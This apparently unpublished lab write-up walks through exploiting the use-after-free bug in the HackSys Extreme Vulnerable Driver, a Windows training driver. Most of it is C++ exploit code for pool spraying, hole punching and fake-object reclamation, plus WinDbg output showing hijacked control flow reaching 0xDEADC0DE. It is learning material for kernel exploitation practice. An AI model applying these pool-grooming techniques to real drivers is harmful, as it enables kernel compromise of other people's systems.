---
title: Windows Kernel Exploitation 0x07 | Use After Free
published: false
tags: [ "kernelexploitation", "windows", "lab" ]
image: assets/previews/12.jpg
layout: page
pagination: 
  enabled: true
---

[manual](https://rootkits.xyz/blog/2018/04/kernel-use-after-free/)

[another manual](https://h0mbre.github.io/HEVD_Use_After_Free_32bit/#)

[3 manual](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/)

[4 manual](https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/)

## [](#header-2)This is it's Use After Free

In the [source code](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c) at 212 line we can find FreeUaFObjectNonPagedPool function where, if SECURE flag is set, when Pool chunk is freed the pointer to the chunk (g_UseAfterFreeObjectNonPagedPool) is set to zero, so it would not be used in the future

In IOCTL we have
```js
0x222013 : AllocateUaFObjectNonPagedPoolIoctlHandler

0x22201F : AllocateFakeObjectNonPagedPoolIoctlHandler

0x22201B : FreeUaFObjectNonPagedPoolIoctlHandler

0x222017 : UseUaFObjectNonPagedPoolIoctlHandler
```

```js
ed nt!Kd_Default_Mask 8

.sympath+ C:\Users\user\Documents\VM\pdbs
```

In the manual, which I follow, the writer for some reason splited the code like the allocation and freeing are executing in different files. Obviously not because g_UseAfterFreeObjectNonPagedPoolNx will be cleared and the next part of freeing will not be executed

So we need: 

```c++
#include <stdio.h>
#include <Windows.h>

#define AllocateUaFObjectNonPagedPoolIoctlHandler 0x222013
#define AllocateFakeObjectNonPagedPoolIoctlHandler 0x22201F
#define FreeUaFObjectNonPagedPoolIoctlHandler 0x22201B
#define UseUaFObjectNonPagedPoolIoctlHandler 0x222017

HANDLE hDevice;

int main() {

    hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL);

    printf("[+] Start to get HANDLE...\n");
    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
    {
        return FALSE;
    }
    printf("[+] Success to get HANDLE!\n");

    DWORD bReturn = 0;
    char buf[4];
    memset(buf, 'A', sizeof(buf));

    DeviceIoControl(hDevice, AllocateUaFObjectNonPagedPoolIoctlHandler, NULL, NULL, NULL, 0, &bReturn, NULL);
    DeviceIoControl(hDevice, UseUaFObjectNonPagedPoolIoctlHandler, NULL, NULL, NULL, 0, &bReturn, NULL);

    return 0;
}
```

In such case we'll get:

```js

kd> bp HEVD!AllocateUaFObjectNonPagedPool
kd> bp HEVD!UseUaFObjectNonPagedPoolIoctlHandler

HEVD!AllocateUaFObjectNonPagedPool:
kd> gu
[+] Allocating UaF Object
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x60
[+] Pool Chunk: 0xFFFF8602301FF760
[+] UseAfterFree Object: 0xFFFF8602301FF760
[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFF8602301FF760
[+] UseAfterFree->Callback: 0xFFFFF80022457C58

kd> db 0xFFFF8602301FF760
ffff8602`301ff760  58 7c 45 22 00 f8 ff ff-41 41 41 41 41 41 41 41  X|E"....AAAAAAAA
ffff8602`301ff770  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff8602`301ff780  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff8602`301ff790  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff8602`301ff7a0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
ffff8602`301ff7b0  41 41 41 41 41 41 41 41-41 41 41 00 65 00 00 00  AAAAAAAAAAA.e...
ffff8602`301ff7c0  00 03 07 02 52 78 53 43-40 06 00 00 00 00 00 00  ....RxSC@.......
ffff8602`301ff7d0  10 30 10 30 02 86 ff ff-30 84 10 30 02 86 ff ff  .0.0....0..0....

kd> g

HEVD!UseUaFObjectNonPagedPoolIoctlHandler:
kd> gu
[+] Using UaF Object
[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFF8602301FF760
[+] g_UseAfterFreeObjectNonPagedPool->Callback: 0xFFFFF80022457C58
[+] Calling Callback
[+] UseAfter Free Object Callback NonPagedPool

```

Now the steps we need to follow to exploit (as in the article):

- fill up the non-paged pool predictably
- Allocate the UAF objects
- Free the UAF objects
- Allocating the fake objects with our shellcode pointer
- Calling the stale UAF pointer with the callback function, which will ultimately execute our shellcode, residing in the pointer address

From now on will use h0mbre's code because again it's so beautiful

```c++
#include <iostream>
#include <vector>
#include <Windows.h>

using namespace std;

#define DEVICE_NAME             L"\\\\.\\HackSysExtremeVulnerableDriver"
#define ALLOCATE_UAF_IOCTL      0x222013
#define FREE_UAF_IOCTL          0x22201B
#define FAKE_OBJECT_IOCTL       0x22201F
#define USE_UAF_IOCTL           0x222017

vector<HANDLE> defrag_handles;
vector<HANDLE> sequential_handles;

typedef struct _LSA_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    UNICODE_STRING* ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;

#define POBJECT_ATTRIBUTES OBJECT_ATTRIBUTES*

typedef NTSTATUS(WINAPI* _NtAllocateReserveObject)(
    OUT PHANDLE hObject,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN DWORD ObjectType);

HANDLE grab_handle() {

    HANDLE hFile = CreateFileW(DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "[!] No handle to HackSysExtremeVulnerableDriver\n";
        exit(1);
    }

    cout << "[>] Grabbed handle to HackSysExtremeVulnerableDriver: " << hex
        << hFile << "\n";

    return hFile;
}

void create_UAF_object(HANDLE hFile) {

    cout << "[>] Creating UAF object...\n";
    BYTE input_buffer[] = "\x00";

    DWORD bytes_ret = 0x0;

    int result = DeviceIoControl(hFile,
        ALLOCATE_UAF_IOCTL,
        input_buffer,
        sizeof(input_buffer),
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        cout << "[!] Could not create UAF object\n";
        cout << "[!] Last error: " << dec << GetLastError() << "\n";
        exit(1);
    }
    cout << "[>] UAF object allocated.\n";
}

void free_UAF_object(HANDLE hFile) {

    cout << "[>] Freeing UAF object...\n";
    BYTE input_buffer[] = "\x00";

    DWORD bytes_ret = 0x0;

    int result = DeviceIoControl(hFile,
        FREE_UAF_IOCTL,
        input_buffer,
        sizeof(input_buffer),
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        cout << "[!] Could not free UAF object\n";
        cout << "[!] Last error: " << dec << GetLastError() << "\n";
        exit(1);
    }
    cout << "[>] UAF object freed.\n";
}

void allocate_fake_object(HANDLE hFile) {

    cout << "[>] Creating fake UAF object...\n";
    BYTE input_buffer[0x58] = { 0 };

    memset((void*)input_buffer, '\x41', 0x58);

    DWORD bytes_ret = 0x0;

    int result = DeviceIoControl(hFile,
        FAKE_OBJECT_IOCTL,
        input_buffer,
        sizeof(input_buffer),
        NULL,
        0,
        &bytes_ret,
        NULL);

    if (!result) {
        cout << "[!] Could not create fake UAF object\n";
        cout << "[!] Last error: " << dec << GetLastError() << "\n";
        exit(1);
    }
    cout << "[>] Fake UAF object created.\n";
}

void spray() {

    // thanks Tekwizz as usual
    _NtAllocateReserveObject NtAllocateReserveObject = (_NtAllocateReserveObject)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateReserveObject");

    if (!NtAllocateReserveObject) {
        cout << "[!] Failed to get the address of NtAllocateReserve.\n";
        cout << "[!] Last error " << GetLastError() << "\n";
        exit(1);
    }

    cout << "[>] Spraying pool to defragment...\n";
    for (int i = 0; i < 10000; i++) {

        HANDLE hObject = 0x0;

        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hObject, NULL, 1); // specifies the correct object

        if (result != 0) {
            cout << "[!] Error allocating IoCo Object during defragmentation\n";
            exit(1);
        }
        defrag_handles.push_back(hObject);
    }
    cout << "[>] Defragmentation spray complete.\n";
    cout << "[>] Spraying sequential allocations...\n";
    for (int i = 0; i < 30000; i++) {

        HANDLE hObject = 0x0;

        PHANDLE result = (PHANDLE)NtAllocateReserveObject((PHANDLE)&hObject, NULL, 1); // specifies the correct object

        if (result != 0) {
            cout << "[!] Error allocating IoCo Object during defragmentation\n";
            exit(1);
        }
        sequential_handles.push_back(hObject);
    }
    cout << "[>] Sequential spray complete.\n";

    cout << "[>] Poking 0x60 byte-sized holes in our sequential allocation...\n";
    for (int i = 0; i < sequential_handles.size(); i++) {
        if (i % 2 == 0) {
            BOOL freed = CloseHandle(sequential_handles[i]);
        }
    }
    cout << "[>] Holes poked lol.\n";
    cout << "[>] Some handles: " << hex << sequential_handles[29997] << "\n";
    cout << "[>] Some handles: " << hex << sequential_handles[29998] << "\n";
    cout << "[>] Some handles: " << hex << sequential_handles[29999] << "\n";

    Sleep(1000);
    DebugBreak();
}

int main() {

    HANDLE hFile = grab_handle();
    //create_UAF_object(hFile);
    //free_UAF_object(hFile);
    //allocate_fake_object(hFile);
    spray();

    return 0;
}
```

```js
We get one of the handles in user command line

kd> !handle 274B4

PROCESS ffff8602375dc080
    SessionId: 1  Cid: 1154    Peb: f0e9b87000  ParentCid: 15f8
    DirBase: 12a654000  ObjectTable: ffffa3012c229080  HandleCount: 25082.
    Image: HEVD_client.exe

Handle table at ffffa3012c229080 with 25082 entries in use

274b4: Object: ffff86023a774630  GrantedAccess: 000f0003 Entry: ffffa3012d7502d0
Object: ffff86023a774630  Type: (ffff8602306b54e0) IoCompletionReserve
    ObjectHeader: ffff86023a774600 (new version)
        HandleCount: 1  PointerCount: 1

kd> !pool ffff86023a774630
Pool page ffff86023a774630 region is Nonpaged pool
 ffff86023a774090 size:   c0 previous size:    0  (Allocated)  IoCo
 ffff86023a774150 size:   c0 previous size:    0  (Allocated)  IoCo
 ffff86023a774210 size:   c0 previous size:    0  (Allocated)  IoCo
 ffff86023a7742d0 size:   c0 previous size:    0  (Free)       IoCo
 ffff86023a774390 size:   c0 previous size:    0  (Allocated)  IoCo
 ffff86023a774450 size:   c0 previous size:    0  (Free)       IoCo
 ffff86023a774510 size:   c0 previous size:    0  (Allocated)  IoCo
*ffff86023a7745d0 size:   c0 previous size:    0  (Allocated) *IoCo
		Owning component : Unknown (update pooltag.txt)
 ffff86023a774690 size:   c0 previous size:    0  (Allocated)  IoCo
 ffff86023a774750 size:   c0 previous size:    0  (Free)       IoCo
 ffff86023a774810 size:   c0 previous size:    0  (Allocated)  IoCo
 ffff86023a7748d0 size:   c0 previous size:    0  (Free)       IoCo
 ffff86023a774990 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774a50 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774b10 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774bd0 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774c90 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774d50 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774e10 size:   c0 previous size:    0  (Free)       ....
 ffff86023a774ed0 size:   c0 previous size:    0  (Free)       ....

```

We will follow the code of the 4-th manual:

```c++
#include <stdio.h>
#include <Windows.h>

#define ALLOCATE_UAF_IOCTL 0x222013
#define FREE_UAF_IOCTL 0x22201B
#define USE_UAF_IOCTL 0x222017

int main() {
    DWORD bytesWritten;
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }

    // Allocate UAF Object
    DeviceIoControl(hDriver, ALLOCATE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);
    // Debug
    DebugBreak();
    // Free UAF Object
    DeviceIoControl(hDriver, FREE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);

    return 0;
}
```

Same as in the manual we can check the allocated pool (we know it's tag Hack):
```js
kd> !poolused 2 Hack
NonPaged                  Paged
Tag     Allocs         Used     Allocs         Used
Hack         1          112          0            0	UNKNOWN pooltag 'Hack', please update pooltag.txt
```

Get the address of the object:

```js
!poolfind Hack -nonpaged
(in my case it worked soooo long)
```

```c++
#include <stdio.h>
#include <Windows.h>

#define ALLOCATE_UAF_IOCTL 0x222013
#define FREE_UAF_IOCTL 0x22201B
#define USE_UAF_IOCTL 0x222017

void Error(const char* name) {
    printf("%s Error: %d\n", name, GetLastError());
    exit(-1);
}

typedef struct PipeHandles {
    HANDLE read;
    HANDLE write;
} PipeHandles;

PipeHandles CreatePipeObject() {
    DWORD ALLOC_SIZE = 0x70;
    BYTE uBuffer[0x28]; // ALLOC_SIZE - HEADER_SIZE (0x48)
    HANDLE readPipe = NULL;
    HANDLE writePipe = NULL;
    DWORD resultLength;

    RtlFillMemory(uBuffer, 0x28, 0x41);
    if (!CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer))) {
        Error("CreatePipe");
    }

    if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL)) {
        Error("WriteFile");
    }
    return PipeHandles{ readPipe, writePipe };
}

int main() {
    DWORD bytesWritten;
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
        exit(1);
    }
    DebugBreak();
    PipeHandles pipeHandle = CreatePipeObject();
    printf("[>] Handles: 0x%llx, 0x%llx\n", pipeHandle.read, pipeHandle.write);
    getchar();
    DebugBreak();

    // Allocate UAF Object
    DeviceIoControl(hDriver, ALLOCATE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);
    // Debug
    DebugBreak();
    // Free UAF Object
    DeviceIoControl(hDriver, FREE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL);

    return 0;
}
```

```js
kd> !handle 0xBC

PROCESS ffff9c09077c5080
    SessionId: 1  Cid: 1554    Peb: a02b0e000  ParentCid: 1474
    DirBase: 185ab6000  ObjectTable: ffffd40c374a53c0  HandleCount:  48.
    Image: HEVD_client.exe

Handle table at ffffd40c374a53c0 with 48 entries in use

00bc: Object: ffff9c090931e700  GrantedAccess: 00120189 (Protected) (Audit) Entry: ffffd40c353b42f0
Object: ffff9c090931e700  Type: (ffff9c09006e2820) File
    ObjectHeader: ffff9c090931e6d0 (new version)
        HandleCount: 1  PointerCount: 32768

kd> !address ffff9c090931e700

Usage:                  
Base Address:           ffff985e`787f3000
End Address:            ffffb380`00000000
Region Size:            00001b21`8780d000
VA Type:                SystemRange
kd> !pool ffff9c090931e700
Pool page ffff9c090931e700 region is Nonpaged pool
 ffff9c090931e040 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931e1d0 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931e360 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931e4f0 size:  190 previous size:    0  (Allocated)  File
*ffff9c090931e680 size:  190 previous size:    0  (Allocated) *File
		Pooltag File : File objects
 ffff9c090931e810 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931e9a0 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931eb30 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931ecc0 size:  190 previous size:    0  (Allocated)  File
 ffff9c090931ee50 size:  190 previous size:    0  (Allocated)  File
```

As the author writes:

- Allocate a lot of DATA_ENTRY objects (CreatePipe + WriteFile)
- Free every 2nd DATA_ENTRY object to create a lot of holes
- Allocate the UAF object and Free it (this will likely happen in one of the holes we just created)
- Allocate a lot of fake objects to fill every hole (including the one we have to hit to successfully exploit it) 

```c++
#include <stdio.h>
#include <Windows.h>
#include <vector>
 
#define QWORD ULONGLONG
 
#define ALLOCATE_UAF_IOCTL 0x222013
#define FREE_UAF_IOCTL 0x22201B
#define USE_UAF_IOCTL 0x222017
#define FAKE_OBJECT_IOCTL 0x22201F
 
void Error(const char* name) {
    printf("%s Error: %d\n", name, GetLastError());
    exit(-1);
}
 
typedef struct PipeHandles {
    HANDLE read;
    HANDLE write;
} PipeHandles;
 
PipeHandles CreatePipeObject() {
    DWORD ALLOC_SIZE = 0x70;
    BYTE uBuffer[0x28]; // ALLOC_SIZE - HEADER_SIZE (0x48)
    BOOL res = FALSE;
    HANDLE readPipe = NULL;
    HANDLE writePipe = NULL;
    DWORD resultLength;
 
    RtlFillMemory(uBuffer, 0x28, 0x41);
    if (!CreatePipe(&readPipe, &writePipe, NULL, sizeof(uBuffer))) {
        Error("CreatePipe");
    }
 
    if (!WriteFile(writePipe, uBuffer, sizeof(uBuffer), &resultLength, NULL)) {
        Error("WriteFile");
    }
    return PipeHandles{ readPipe, writePipe };
}
 
int main() {
    DWORD bytesWritten;
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        Error("CreateFile");
    }
 
    printf("[>] Spraying objects for pool defragmentation..\n");
    std::vector<PipeHandles> defragPipeHandles;
    for (int i = 0; i < 20000; i++) {
        PipeHandles pipeHandle = CreatePipeObject();
        defragPipeHandles.push_back(pipeHandle);
    }
 
    printf("[>] Spraying objects in sequential allocation..\n");
    std::vector<PipeHandles> seqPipeHandles;
    for (int i = 0; i < 60000; i++) {
        PipeHandles pipeHandle = CreatePipeObject();
        seqPipeHandles.push_back(pipeHandle);
    }
 
    printf("[>] Creating object holes..\n");
    for (int i = 0; i < seqPipeHandles.size(); i++) {
        if (i % 2 == 0) {
            PipeHandles handles = seqPipeHandles[i];
            CloseHandle(handles.read);
            CloseHandle(handles.write);
        }
    }
 
    printf("[>] Allocating UAF Object\n");
    if (!DeviceIoControl(hDriver, ALLOCATE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL)) {
        //Error("Allocate UAF Object");
    }
 
    printf("[>] Freeing UAF Object\n");
    if (!DeviceIoControl(hDriver, FREE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL)) {
        Error("Free UAF Object");
    }
 
    printf("[>] Filling holes with custom objects..\n");
    BYTE uBuffer[0x60] = { 0 };
    *(QWORD*)(uBuffer) = (QWORD)(0xdeadc0de);
    for (int i = 0; i < 30000; i++) {
        if (!DeviceIoControl(hDriver, FAKE_OBJECT_IOCTL, uBuffer, sizeof(uBuffer), NULL, 0, &bytesWritten, NULL)) {
            Error("Allocate Custom Object");
        }
    }
 
    printf("[>] Triggering callback on UAF object..\n");
    if (!DeviceIoControl(hDriver, USE_UAF_IOCTL, NULL, NULL, NULL, 0, &bytesWritten, NULL)) {
        Error("Use UAF Object");
    }
    return 0;
}
```

POOL1.PNG IMAGE HERE !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


You should restart it twice or more, because random is not the last here :)
```js
Result:
We see that it tried to execute out deadcode address

kd> g
KDTARGET: Refreshing KD connection

*** Fatal System Error: 0x00000139
                       (0x0000000000000000,0x0000000000000000,0x0000000000000000,0x00000000DEADC0DE)

Break instruction exception - code 80000003 (first chance)

A fatal system error has occurred.
Debugger entered on first try; Bugcheck callbacks have not been invoked.

A fatal system error has occurred.

For analysis of this file, run !analyze -v
nt!DbgBreakPointWithStatus:
fffff806`66a00fc0 cc              int     3
```



ed nt!Kd_Default_Mask 8
.sympath+ C:\Users\truebad0ur\Documents\VM\HEVD\HEVD_client\x64\Release
.sympath+ C:\Users\truebad0ur\Documents\VM\HEVD
bp hevd!UseUaFObjectNonPagedPool
bp hevd!AllocateFakeObjectNonPagedPool